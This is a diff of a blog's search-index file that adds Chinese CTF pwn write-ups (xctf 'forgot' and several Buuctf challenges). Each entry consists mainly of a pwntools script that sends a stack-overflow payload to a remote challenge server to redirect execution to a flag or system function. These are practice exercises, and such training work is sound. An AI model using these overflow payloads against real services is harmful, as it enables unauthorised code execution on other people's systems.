@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>forgot</title>
+      <link href="/2022/01/13/forgot/"/>
+      <url>/2022/01/13/forgot/</url>
+      
+        <content type="html"><![CDATA[<ul><li><p>checksec</p><img src="/2022/01/13/forgot/checksec.png" alt="image-20220113132119292" style="zoom:80%;"></li><li><p>ida</p></li></ul><p>​                                       <img src="/2022/01/13/forgot/flag.png" alt="image-20220113162931499" style="zoom:80%;"></p><p>​                                                                         cat  flag函数</p><ul><li><p>运行</p><img src="/2022/01/13/forgot/run.png" alt="image-20220113163122226" style="zoom:67%;"></li><li><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *log_level = 'debug'elf = ELF("./forgot")local = 0if local:    r = process("./forgot")else:    r = remote("111.200.241.244",55953)flag_addr = 0x080486CCpayload = b'A'*(0x74-0x54) + p64(flag_addr)r.sendlineafter("&gt; ","NAME")r.sendlineafter("&gt; ",payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> pwn </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> xctf </tag>
+            
+            <tag> 栈溢出 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>dice_game</title>
       <link href="/2022/01/12/dice-game/"/>
       <url>/2022/01/12/dice-game/</url>
@@ -22,6 +49,8 @@
             
             <tag> 简单随机数绕过 </tag>
             
+            <tag> xctf </tag>
+            
         </tags>
       
     </entry>
@@ -29,11 +58,11 @@
     
     
     <entry>
-      <title>Buuctf 解题</title>
+      <title>Buuctf wp</title>
       <link href="/2022/01/12/buuctf/"/>
       <url>/2022/01/12/buuctf/</url>
       
-        <content type="html"><![CDATA[<ol><li><p>pwn1</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *log_level = 'debug'elf = ELF("./pwn1")local = 0if local:   r = process("./pwn1")else:   r = remote("node4.buuoj.cn",29317)bin_sh = 0x000000000040118Asystem_addr = 0x0000000000401191payload = b'a'*0x0F + p64(system_addr) + p64(bin_sh)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>warmup_csaw_2016</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os='linux',arch= 'amd64',log_level='debug')elf = ELF("./warmup")local = 0if local:    r = process("./warmup")else:    r = remote("node4.buuoj.cn",29230)addr = 0x000000000040060epayload = b'a'*72 + p64(addr)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
+        <content type="html"><![CDATA[<ol><li><p>pwn1</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *log_level = 'debug'elf = ELF("./pwn1")local = 0if local:   r = process("./pwn1")else:   r = remote("node4.buuoj.cn",29317)bin_sh = 0x000000000040118Asystem_addr = 0x0000000000401191payload = b'a'*0x0F + p64(system_addr) + p64(bin_sh)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>warmup_csaw_2016</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os='linux',arch= 'amd64',log_level='debug')elf = ELF("./warmup")local = 0if local:    r = process("./warmup")else:    r = remote("node4.buuoj.cn",29230)addr = 0x000000000040060epayload = b'a'*72 + p64(addr)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li><p>cisn_2019_n_1</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os='linux',arch='amd64',log_level='debug')elf=ELF("./ciscn")local = 0if local:    r = process("./ciscn")else:    r = remote("node4.buuoj.cn",28539)v2=0x41348000 //11.28125的十六进制形式payload = b'a'*(0x30-0x04)+p64(v2)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol></li><li><p>pwn1_sctf_2016</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *log_level = 'debug'elf = ELF("./pwn1_sctf")local = 0if local:    r = process("./pwn1_sctf")else:    r = remote("node4.buuoj.cn",28883)get_flag = 0x08048F0Dpayload = b'I'*20 + b'a'*4 + p32(get_flag)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>level0</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os = 'linux',arch = 'amd64',log_level = 'debug')elf = ELF("./level0")local = 0if local:    r = process("./level0")else:    r = remote("node4.buuoj.cn",26837)call_system = 0x0000000000400596payload = b'a'*0x80+p64(0)+p64(call_system)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
       
       
       <categories>
@@ -45,7 +74,7 @@
       
         <tags>
             
-            <tag> 简单wp </tag>
+            <tag> buuctf </tag>
             
         </tags>
       
